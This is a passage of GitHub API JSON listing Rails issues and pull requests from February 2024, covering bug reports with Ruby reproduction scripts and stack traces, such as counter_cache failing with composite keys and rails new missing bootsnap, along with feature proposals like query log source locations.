        "updated_at": "2024-02-06T07:59:29Z",
        "closed_at": "2024-02-05T18:07:19Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50970",
            "html_url": "https://github.com/rails/rails/pull/50970",
            "diff_url": "https://github.com/rails/rails/pull/50970.diff",
            "patch_url": "https://github.com/rails/rails/pull/50970.patch",
            "merged_at": "2024-02-05T18:07:19Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/50964\r\n\r\nOpening a PR because the patch didn't apply cleanly. This should make ruby-head pass on Ruby `3.4-dev`.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50970/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50970/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50969",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50969/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50969/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50969/events",
        "html_url": "https://github.com/rails/rails/pull/50969",
        "id": 2118649088,
        "node_id": "PR_kwDNIULOZgdpmw",
        "number": 50969,
        "title": "Support `:source_location` tag option for query log tags",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-05T14:06:30Z",
        "updated_at": "2024-02-06T10:05:17Z",
        "closed_at": "2024-02-06T08:18:11Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50969",
            "html_url": "https://github.com/rails/rails/pull/50969",
            "diff_url": "https://github.com/rails/rails/pull/50969.diff",
            "patch_url": "https://github.com/rails/rails/pull/50969.patch",
            "merged_at": "2024-02-06T08:18:11Z"
        },
        "body": "Follow up to #42240 (as discussed in https://github.com/rails/rails/pull/42240#issuecomment-1926446571).\r\n\r\nWe lost the ability to use the `:line` option with QueryLogs (https://github.com/rails/rails/pull/42240#issuecomment-898668464), while there is one in the marginalia. It was costly to use it before in the gem, but we made it fast (https://github.com/basecamp/marginalia/pull/138), so it is not *that* costly and people deliberately decide if they want to use it.\r\n\r\nI would like to have the `:line` option (upd: decided to name it as `:source_location`), it is very much useful. Without it, if we have a slow db query log, for example, it is very hard to know from which part of the codebase the query was generated. Even having an `:action` component, you need to investigate the unfamiliar codebase to find out where the query was triggered.\r\n\r\ncc @byroot ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50969/reactions",
            "total_count": 3,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50969/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50968",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50968/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50968/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50968/events",
        "html_url": "https://github.com/rails/rails/issues/50968",
        "id": 2118566194,
        "node_id": "I_kwDNIULOfkbBMg",
        "number": 50968,
        "title": "counter_cache doesn't work with composite PKs",
        "user": {
            "login": "fragkakis",
            "id": 222875,
            "node_id": "MDQ6VXNlcjIyMjg3NQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/222875?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fragkakis",
            "html_url": "https://github.com/fragkakis",
            "followers_url": "https://api.github.com/users/fragkakis/followers",
            "following_url": "https://api.github.com/users/fragkakis/following{/other_user}",
            "gists_url": "https://api.github.com/users/fragkakis/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fragkakis/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fragkakis/subscriptions",
            "organizations_url": "https://api.github.com/users/fragkakis/orgs",
            "repos_url": "https://api.github.com/users/fragkakis/repos",
            "events_url": "https://api.github.com/users/fragkakis/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fragkakis/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-05T13:29:23Z",
        "updated_at": "2024-02-09T07:16:52Z",
        "closed_at": "2024-02-09T07:16:52Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :test_background_check_requests, force: true do |t|\r\n    t.integer :candidate_id\r\n    t.integer :account_id\r\n    t.string :name\r\n  end\r\n\r\n  create_table :test_candidates, force: true, primary_key: %i[candidate_id account_id] do |t|\r\n    t.integer :candidate_id\r\n    t.integer :account_id\r\n    t.integer :test_background_check_requests_count\r\n    t.string :name\r\n  end\r\nend\r\n\r\nclass TestCandidate < ActiveRecord::Base\r\n  self.primary_key = %i[candidate_id account_id]\r\n  has_many :test_background_check_requests, query_constraints: [:candidate_id, :account_id], inverse_of: :test_candidate\r\nend\r\n\r\nclass TestBackgroundCheckRequest < ActiveRecord::Base\r\n  belongs_to :test_candidate, counter_cache: true, query_constraints: [:candidate_id, :account_id]\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_association_stuff\r\n    test_candidate = TestCandidate.create!(candidate_id: 1, account_id: 1, name: \"Foo Barson\")\r\n    test_candidate.test_background_check_requests.create!(candidate_id: 1, account_id: 1, name: \"Background check request 1\")\r\n\r\n    assert_equal 1, TestBackgroundCheckRequest.count\r\n    assert_equal 1, test_candidate.reload.test_background_check_requests_count\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nIt is expected that the creation of the `TestBackgroundCheckRequest` will succeed, and that the associated `TestCandidate` would have a `test_background_check_request_count` of `1`.\r\n\r\n### Actual behavior\r\n\r\nThe creation of the `TestBackgroundCheckRequest` fails with the following exception:\r\n\r\n```\r\n3.2.2 :057 > candidate.test_background_check_requests.create!(candidate_id: 1, account_id: 1, name: \"Background check request 1\")\r\nD, [2024-02-05T15:23:08.589637 #90419] DEBUG -- :   TRANSACTION (0.0ms)  begin transaction\r\nD, [2024-02-05T15:23:08.589781 #90419] DEBUG -- :   TestBackgroundCheckRequest Create (0.2ms)  INSERT INTO \"test_background_check_requests\" (\"candidate_id\", \"account_id\", \"name\") VALUES (?, ?, ?) RETURNING \"id\"  [[\"candidate_id\", 1], [\"account_id\", 1], [\"name\", \"Background check request 1\"]]\r\nD, [2024-02-05T15:23:08.589958 #90419] DEBUG -- :   TRANSACTION (0.0ms)  rollback transaction\r\n/Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:82:in `block (2 levels) in expand_from_hash': Expected corresponding value for [\"candidate_id\", \"account_id\"] to be an Array (ArgumentError)\r\n\r\n              raise ArgumentError, \"Expected corresponding value for #{key} to be an Array\" unless ids_set.is_a?(Array)\r\n                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:81:in `map'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:81:in `block in expand_from_hash'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:79:in `each'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:79:in `flat_map'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:79:in `expand_from_hash'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/predicate_builder.rb:25:in `build_from_hash'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/query_methods.rb:1530:in `build_where_clause'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/relation/query_methods.rb:943:in `where!'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/counter_cache.rb:116:in `update_counters'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/locking/optimistic.rb:182:in `update_counters'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/persistence.rb:976:in `increment!'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/locking/optimistic.rb:64:in `increment!'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/callbacks.rb:436:in `increment!'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/associations/belongs_to_association.rb:106:in `update_counters'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/associations/belongs_to_association.rb:58:in `increment_counters'\r\n\tfrom /Users/markosfragkakis/.rvm/gems/ruby-3.2.2/bundler/gems/rails-0add5dba834f/activerecord/lib/active_record/counter_cache.rb:203:in `block in _create_record'\r\n\t... 44 levels...\r\n3.2.2 :058 > \r\n```\r\n\r\n### System configuration\r\n**Rails version**:\r\n7.1.3\r\n**Ruby version**:\r\n3.2.2",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50968/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50968/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50967",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50967/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50967/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50967/events",
        "html_url": "https://github.com/rails/rails/pull/50967",
        "id": 2118334223,
        "node_id": "PR_kwDNIULOZgME1w",
        "number": 50967,
        "title": "Fix Active Storage test configurations for CI",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-05T11:47:28Z",
        "updated_at": "2024-02-07T02:37:07Z",
        "closed_at": "2024-02-06T08:18:56Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50967",
            "html_url": "https://github.com/rails/rails/pull/50967",
            "diff_url": "https://github.com/rails/rails/pull/50967.diff",
            "patch_url": "https://github.com/rails/rails/pull/50967.patch",
            "merged_at": "2024-02-06T08:18:56Z"
        },
        "body": "This change is an up-port of #50787 which applied a similar fix to 7-1-stable.\r\n\r\nSince these tests weren't running before, we didn't notice when the DirectUploads controller tests were broken. My theory is that it has something to do with changing `response.parsed_body` to return a HWIA (in #49003).\r\n\r\nThis change is different from the 7-1-stable PR in that it removes the need to stringify or symbolize any keys, since we are comparing the metadata with string keys. This is a follow up to #43705.\r\n\r\nThis PR came out of the work in #50427, but since I was able to reproduce these failures on main, I wanted to fix them first.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50967/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50967/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50966",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50966/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50966/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50966/events",
        "html_url": "https://github.com/rails/rails/issues/50966",
        "id": 2118277607,
        "node_id": "I_kwDNIULOfkJZ5w",
        "number": 50966,
        "title": "rails new fails if bootsnap is missing from the Gemfile used to run the 'rails new' command (updated)",
        "user": {
            "login": "koenhandekyn",
            "id": 710262,
            "node_id": "MDQ6VXNlcjcxMDI2Mg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/710262?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/koenhandekyn",
            "html_url": "https://github.com/koenhandekyn",
            "followers_url": "https://api.github.com/users/koenhandekyn/followers",
            "following_url": "https://api.github.com/users/koenhandekyn/following{/other_user}",
            "gists_url": "https://api.github.com/users/koenhandekyn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/koenhandekyn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/koenhandekyn/subscriptions",
            "organizations_url": "https://api.github.com/users/koenhandekyn/orgs",
            "repos_url": "https://api.github.com/users/koenhandekyn/repos",
            "events_url": "https://api.github.com/users/koenhandekyn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/koenhandekyn/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-05T11:18:21Z",
        "updated_at": "2024-02-09T23:27:58Z",
        "closed_at": "2024-02-09T23:27:58Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\ni'm launching this from a root dir with a gemfile pointing to rails/rails latest greatest as of today (some 720alpha version in other words) \r\n\r\n```bash\r\nbe rails new rails-blank-7.2.0.alpha --css=tailwind -a=propshaft\r\n```\r\n\r\nnote that moving into the dir and then manually doing the ```rails importmap:install``` actually works! \r\n\r\n### Expected behavior\r\n\r\na rails app ready to get rolling \r\n\r\n### Actual behavior\r\n\r\n```\r\n         run  bundle install --quiet\r\n         run  bundle lock --add-platform=x86_64-linux\r\nWriting lockfile to /Users/koenhandekyn/Work/rails-blank-7.2.0.alpha/Gemfile.lock\r\n         run  bundle lock --add-platform=aarch64-linux\r\nWriting lockfile to /Users/koenhandekyn/Work/rails-blank-7.2.0.alpha/Gemfile.lock\r\n         run  bundle binstubs bundler\r\n       rails  importmap:install\r\n<internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require': cannot load such file -- bootsnap/setup (LoadError)\r\n\tfrom <internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require'\r\n\tfrom /Users/koenhandekyn/Work/rails-blank-7.2.0.alpha/config/boot.rb:4:in `<top (required)>'\r\n\tfrom bin/rails:3:in `require_relative'\r\n\tfrom bin/rails:3:in `<main>'\r\n       rails  turbo:install stimulus:install\r\n<internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require': cannot load such file -- bootsnap/setup (LoadError)\r\n\tfrom <internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require'\r\n\tfrom /Users/koenhandekyn/Work/rails-blank-7.2.0.alpha/config/boot.rb:4:in `<top (required)>'\r\n\tfrom bin/rails:3:in `require_relative'\r\n\tfrom bin/rails:3:in `<main>'\r\n       rails  tailwindcss:install\r\n<internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require': cannot load such file -- bootsnap/setup (LoadError)\r\n\tfrom <internal:/Users/koenhandekyn/.rbenv/versions/3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:37:in `require'\r\n\tfrom /Users/koenhandekyn/Work/rails-blank-7.2.0.alpha/config/boot.rb:4:in `<top (required)>'\r\n\tfrom bin/rails:3:in `require_relative'\r\n\tfrom bin/rails:3:in `<main>'\r\n```\r\n\r\n### System configuration\r\n\r\n**Rails version**: 7.2.0.alpha\r\n\r\n**Ruby version**: 3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50966/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50966/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50965",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50965/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50965/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50965/events",
        "html_url": "https://github.com/rails/rails/issues/50965",
        "id": 2118194333,
        "node_id": "I_kwDNIULOfkEUnQ",
        "number": 50965,
        "title": "Enums should accept a proc for `default`",
        "user": {
            "login": "ldlgds2",
            "id": 33622125,
            "node_id": "MDQ6VXNlcjMzNjIyMTI1",
            "avatar_url": "https://avatars.githubusercontent.com/u/33622125?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ldlgds2",
            "html_url": "https://github.com/ldlgds2",
            "followers_url": "https://api.github.com/users/ldlgds2/followers",
            "following_url": "https://api.github.com/users/ldlgds2/following{/other_user}",
            "gists_url": "https://api.github.com/users/ldlgds2/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ldlgds2/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ldlgds2/subscriptions",
            "organizations_url": "https://api.github.com/users/ldlgds2/orgs",
            "repos_url": "https://api.github.com/users/ldlgds2/repos",
            "events_url": "https://api.github.com/users/ldlgds2/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ldlgds2/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-05T10:34:07Z",
        "updated_at": "2024-02-06T18:59:32Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nTrying to define a flexible (hence a lambda) default for an enumeration on a model.\r\n \r\n```ruby\r\nenum status: STATUSES.keys, _default: -> { account.in?(%i[superadmin admin]) ? :to_validate : :validated }\r\n```\r\n\r\n### Expected behavior\r\nIt should take into account the attribute of the current model instance.\r\n\r\n### Actual behavior\r\n```ruby\r\nNoMethodError:\r\n        undefined method `account' for User:Class\r\n        Did you mean?  accounts\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 6.1.7.6\r\n\r\n**Ruby version**: 3.1.4\r\n\r\nI would love to contribute by submitting a PR for this.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50965/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50965/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50964",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50964/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50964/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50964/events",
        "html_url": "https://github.com/rails/rails/pull/50964",
        "id": 2117969578,
        "node_id": "PR_kwDNIULOZf4GEA",
        "number": 50964,
        "title": "Improve routes source location detection",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-05T08:40:28Z",
        "updated_at": "2024-02-05T15:52:12Z",
        "closed_at": "2024-02-05T15:52:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50964",
            "html_url": "https://github.com/rails/rails/pull/50964",
            "diff_url": "https://github.com/rails/rails/pull/50964.diff",
            "patch_url": "https://github.com/rails/rails/pull/50964.patch",
            "merged_at": "2024-02-05T15:52:11Z"
        },
        "body": "Followup: https://github.com/rails/rails/pull/50923\r\n\r\nInstead of stopping on the first frame that isn't in Action Dispatch, we should return the first frame that isn't filtered by the backtrace cleaner.\r\n\r\ncc @yahonda ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50964/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50964/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50963",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50963/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50963/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50963/events",
        "html_url": "https://github.com/rails/rails/issues/50963",
        "id": 2117262203,
        "node_id": "I_kwDNIULOfjLbew",
        "number": 50963,
        "title": "Improve ActiveStorage Proxy Documentation",
        "user": {
            "login": "jmarsh24",
            "id": 48605824,
            "node_id": "MDQ6VXNlcjQ4NjA1ODI0",
            "avatar_url": "https://avatars.githubusercontent.com/u/48605824?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jmarsh24",
            "html_url": "https://github.com/jmarsh24",
            "followers_url": "https://api.github.com/users/jmarsh24/followers",
            "following_url": "https://api.github.com/users/jmarsh24/following{/other_user}",
            "gists_url": "https://api.github.com/users/jmarsh24/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jmarsh24/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jmarsh24/subscriptions",
            "organizations_url": "https://api.github.com/users/jmarsh24/orgs",
            "repos_url": "https://api.github.com/users/jmarsh24/repos",
            "events_url": "https://api.github.com/users/jmarsh24/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jmarsh24/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
